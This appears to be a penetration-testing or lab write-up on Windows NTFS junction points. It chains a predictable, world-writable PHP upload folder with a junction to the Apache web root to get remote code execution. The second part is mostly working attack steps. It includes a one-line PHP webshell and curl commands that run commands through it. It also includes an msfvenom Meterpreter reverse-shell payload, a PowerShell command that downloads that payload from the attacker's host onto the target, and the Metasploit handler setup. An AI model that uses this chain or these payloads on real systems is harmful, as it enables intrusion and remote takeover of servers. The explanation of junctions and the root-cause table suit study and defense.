# Junction Links & File Upload → RCE via Junction Abuse

---

## Part 1: Junction Links

### What Is a Junction Link?

A **junction link** (also called a **junction point**) is a type of filesystem redirect in Windows that makes one directory transparently point to another directory. When any application — including the OS itself — accesses the junction, Windows silently redirects all operations to the target path, completely transparent to the calling process.

Junctions are implemented as **reparse points**: special metadata attached to a directory entry in the NTFS filesystem. When NTFS encounters a directory flagged with a reparse point tag, it hands off the path resolution to a reparse handler, which redirects the I/O to the configured target.

---

### Characteristics

| Property | Detail |
|---|---|
| Target type | Directories only (not files) |
| Cross-volume | Yes — can span different local volumes (e.g., `C:\` → `D:\`) |
| Network targets | No — local paths only (no UNC paths like `\\server\share`) |
| Admin required | No — standard users can create junctions |
| Transparency | Full — applications see junctions as normal directories |
| Deletion behavior | Deleting the junction does NOT delete the target or its contents |
| NTFS requirement | Yes — only works on NTFS volumes |

---

### Junction vs Other Link Types

| Feature | Junction | Soft Symlink (`/D`) | Hard Link |
|---|---|---|---|
| Works on | Directories | Files or Directories | Files only |
| Cross-volume (local) | Yes | Yes | No |
| Network target | No | Yes | No |
| Requires admin | No | Yes | No |
| `dir` label | `<JUNCTION>` | `<SYMLINKD>` | *(none)* |
| Reparse point | Yes | Yes | No |

---

### How to Create a Junction

**PowerShell:**
```powershell
New-Item -ItemType Junction -Path "C:\LinkFolder" -Target "C:\TargetFolder"
```

**Command Prompt:**
```cmd
mklink /J C:\LinkFolder C:\TargetFolder
```

---

### How to Identify a Junction

**Using `dir` in cmd.exe:**
```
08/26/2025  11:45 AM    <JUNCTION>     MyFolder [C:\xampp\htdocs]
```
The `<JUNCTION>` tag appears in the Mode column, and the target path is shown in brackets.

**Using `ls` / `dir` in PowerShell:**
```
Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d----l         5/21/2026  12:01 AM                MyFolder
```
The `l` in the Mode column (`d----l`) indicates a reparse point / symbolic link.

**Using `Get-Item`:**
```powershell
Get-Item C:\LinkFolder | Select-Object FullName, LinkType, Target
```

---

### How to Delete a Junction

```powershell
# PowerShell — removes junction only, not target contents
Remove-Item .\JunctionFolder

# cmd.exe
rmdir C:\LinkFolder
```

> **Warning:** Using `Remove-Item -Recurse` or `rd /s` on a junction will delete the junction AND the contents of the target. Always remove the junction without the recursive flag.

---

### How Windows Resolves Junction Paths

When a process opens a path that passes through a junction, NTFS performs the redirect at the **kernel level** before the path reaches the application. The process never knows it was redirected — it simply receives file handles pointing to the real target location. This is why junction abuse is powerful: the writing application (e.g., Apache/PHP) has no awareness that its write destination has changed.

---

### Common Real-World Uses

Windows itself uses junctions extensively for backward compatibility. For example, `C:\Documents and Settings` is a junction pointing to `C:\Users`, allowing legacy applications that hard-code the old path to continue functioning on modern Windows.

## Part 2: File Upload Vulnerability Chained with Junction Link for RCE

### Overview

This attack chains two weaknesses together:

1. A PHP file upload endpoint that stores files in a **predictable, world-writable directory**
2. The ability to **replace that directory with a junction** pointing to the Apache web root

The result is that a file uploaded through the web form lands directly inside `htdocs`, making it web-accessible and executable by Apache — achieving Remote Code Execution.

---

### Step 1: Understand the Upload Logic

Reviewing the PHP source reveals how the upload directory is constructed:

```php
$uploadDir = 'C:/Windows/Tasks/Uploads/';
$folderName = md5($firstname . $lastname . $email);
$targetDir = $uploadDir . $folderName . '/';
```

The subdirectory name is the MD5 hash of three user-controlled form fields concatenated together. This means the upload destination is **fully predictable** — given known input values, the exact folder name can be pre-computed.

**Verify by computing the hash locally:**
```bash
# PHP interactive
php -a
php > echo md5("testtesttest@test.null");
317d52e7c825dd847d9c750a35547edc

# or with bash
echo -n "testtesttest@test.null" | md5sum
317d52e7c825dd847d9c750a35547edc
```

Cross-reference this against the actual directory name visible on disk to confirm the formula.

---

### Step 2: Verify Permissions on the Upload Directory

Before attempting the junction trick, confirm that the current user (Apache service account, `NT AUTHORITY\LOCAL SERVICE`) has sufficient permissions to delete and recreate directories under `C:\Windows\Tasks\Uploads\`.

```powershell
icacls C:\Windows\Tasks\Uploads
```

**What to look for:**
```
C:\Windows\Tasks\Uploads Everyone:(OI)(CI)(F)
```

`Everyone:(OI)(CI)(F)` with no `(I)` flag means this is an **explicit** (not inherited) Full Control grant to all users. This is the misconfiguration that makes the attack possible — it means any user, including the Apache service account, can create, delete, and modify directories here.

Also confirm the Apache web root is writable by the service account:
```powershell
icacls C:\xampp\htdocs
```

Look for `NT AUTHORITY\LOCAL SERVICE:(OI)(CI)(F)` or equivalent — this confirms Apache can write to its own web root, which the junction will redirect writes into.

---

### Step 3: Remove the Existing Upload Folder

The junction must take the exact same name as the folder the PHP script will create. Since the folder already exists from a prior upload, delete it first:

```powershell
Remove-Item .\edc35f7b0fc872e71665ee7f54cbd2b4\ -Recurse
```

> **Note:** Use `-Recurse` here only because this is a plain directory, not a junction. Never use `-Recurse` on a junction pointing to a real directory you want to keep.

Verify it is gone:
```powershell
ls C:\Windows\Tasks\Uploads
```

---

### Step 4: Create the Junction

Create a junction with the same name as the expected upload folder, pointing to the Apache web root:

**PowerShell:**
```powershell
New-Item -ItemType Junction `
  -Path "C:\Windows\Tasks\Uploads\edc35f7b0fc872e71665ee7f54cbd2b4" `
  -Target "C:\xampp\htdocs"
```

**cmd.exe:**
```cmd
mklink /J C:\Windows\Tasks\Uploads\edc35f7b0fc872e71665ee7f54cbd2b4 C:\xampp\htdocs
```

**Verify the junction was created:**
```powershell
dir C:\Windows\Tasks\Uploads
```

Expected output — look for the `<JUNCTION>` tag and target path in brackets:
```
08/26/2025  11:45 AM    <JUNCTION>     edc35f7b0fc872e71665ee7f54cbd2b4 [C:\xampp\htdocs]
```

In PowerShell `ls`, the `l` in the mode column (`d----l`) confirms a reparse point.

**Verify the junction resolves correctly** by listing through it — you should see the actual htdocs contents:
```powershell
dir .\edc35f7b0fc872e71665ee7f54cbd2b4\
```

If you see `index.php`, `assets\`, `css\`, `js\` — the junction is working and pointing at the live web root.

---

### Step 5: Upload the Webshell

Submit the file upload form again using the **exact same** firstname, lastname, and email values used to compute the hash. Upload a PHP webshell as the file:

```php
<?php system($_GET["cmd"]); ?>
```

The PHP application believes it is writing to its normal upload directory. Instead, because the directory is now a junction, Windows transparently redirects the write to `C:\xampp\htdocs\shell.php`.

**Verify the file landed in htdocs:**
```powershell
dir C:\Windows\Tasks\Uploads\edc35f7b0fc872e71665ee7f54cbd2b4\
# or equivalently:
dir C:\xampp\htdocs\
```

The webshell file should now appear in the listing with the current timestamp.

---

### Step 6: Confirm RCE

Access the webshell through the browser or curl:

```bash
curl 'http://TARGET/shell.php?cmd=whoami'
```

Expected output:
```
nt authority\local service
```

If the response is empty with HTTP 200, test with a simpler command first:
```bash
curl 'http://TARGET/shell.php?cmd=echo+hello'
```

A blank response on a known-good file usually means `system()` output is being suppressed — try wrapping in PowerShell:
```bash
curl -G 'http://TARGET/shell.php' \
  --data-urlencode 'cmd=powershell whoami'
```

---

### Step 7: Escalate to Reverse Shell

Generate a staged Meterpreter payload matching the target architecture (confirm with `systeminfo`):

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=<YOUR_IP> LPORT=4444 \
  -f exe -o shell.exe
```

Host and deliver via the webshell:
```bash
# Host on Kali
python3 -m http.server 8080

# Download to target via webshell
curl -G 'http://TARGET/shell.php' \
  --data-urlencode 'cmd=powershell "(New-Object Net.WebClient).DownloadFile(\"http://<YOUR_IP>:8080/shell.exe\",\"C:\\xampp\\htdocs\\shell.exe\")"'
```

Start the handler in Metasploit:
```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <YOUR_IP>
set LPORT 4444
run
```

Execute the payload via webshell:
```bash
curl -G 'http://TARGET/shell.php' \
  --data-urlencode 'cmd=powershell Start-Process C:\xampp\htdocs\shell.exe'
```

> **Important:** The payload type in `msfvenom` and `set payload` in the handler must match exactly. A `shell_reverse_tcp` binary connecting to a `meterpreter/reverse_tcp` handler (or vice versa) will be rejected with `session is not valid`.

---

### Why This Works — Root Cause Summary

| Factor | Detail |
|---|---|
| Predictable upload path | MD5 of user-controlled inputs = attacker can pre-compute the folder name |
| World-writable upload dir | `Everyone:(OI)(CI)(F)` — any user can delete and recreate directories |
| Junction transparency | The PHP app has no awareness the directory was swapped; OS handles the redirect |
| Apache writes to its own root | `NT AUTHORITY\LOCAL SERVICE` has write access to `htdocs` — the junction target |
| No file extension filtering | The app sanitizes unsafe characters but does not block `.php` uploads |

---

### Attack Chain at a Glance

```
Predictable folder name (MD5 of known inputs)
            ↓
Delete existing upload folder
            ↓
Replace with Junction → points to C:\xampp\htdocs
            ↓
Submit upload form → PHP writes shell.php to htdocs via junction
            ↓
Browse to /shell.php → RCE as NT AUTHORITY\LOCAL SERVICE
            ↓
Upload meterpreter payload → Catch reverse shell
```
